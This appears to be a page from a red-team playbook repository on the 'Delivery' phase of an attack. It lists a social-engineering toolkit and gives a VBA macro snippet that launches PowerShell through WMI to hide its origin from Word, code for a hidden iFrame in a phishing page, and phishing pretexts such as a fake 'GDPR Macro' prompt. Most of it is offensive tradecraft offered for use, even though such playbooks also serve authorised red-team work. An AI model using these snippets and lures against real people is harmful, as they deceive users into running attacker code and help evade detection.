# 3 Delivery

## Table of Contents

- [Tooling](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/3-Delivery/3-Delivery.md#tooling)
- [Breack Microsoft Word Parent-Child Relationship](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/3-Delivery/3-Delivery.md#Break-Microsoft-Word-Parent-Child-Relationship)
- [Embedding hidden iFrame in Phishing Page](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/3-Delivery/3-Delivery.md#Embedding-hidden-iFrame-in-Phishing-Page)
- [Phishing Scenarios](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/3-Delivery/3-Delivery.md#Phishing-Scenarios)

## Tooling

| Name | Description | URL |
| --- | --- | --- |
| The Social-Engineer Toolkit (SET) | The Social-Engineer Toolkit (SET) repository from TrustedSec | https://github.com/trustedsec/social-engineer-toolkit |

## Break Microsoft Word Parent-Child Releationship

```vb
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell"
```

## Embedding hidden iFrame in Phishing Page

```HTML
<iframe src="<URL>" width="0" height="0" frameborder="0" tabindex="-1" title="empty" style=visibility:hidden;display:none"> </iframe>
```

## Phishing Scenarios

- `Bitwarden send link` abuse
- `Broken image` - please click to reload
- `GDPR Macro` - please enable macro to see the document content

### Previous

- [2 Weaponization](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2-Weaponization.md)
- [2.1 Initial Access](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2.1-Initial-Access.md)

### Next

- [4 Exploitation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4-Exploitation.md)
- [4.1 Defense Evasion](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.1-Defense-Evasion.md)
- [4.2 Credential Dumping](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.2-Credential-Dumping.md)
- [4.3 Privilege Escalation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.3-Privilege-Escalation.md)
- [4.4 Lateral Movement](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.4-Lateral-Movement.md)
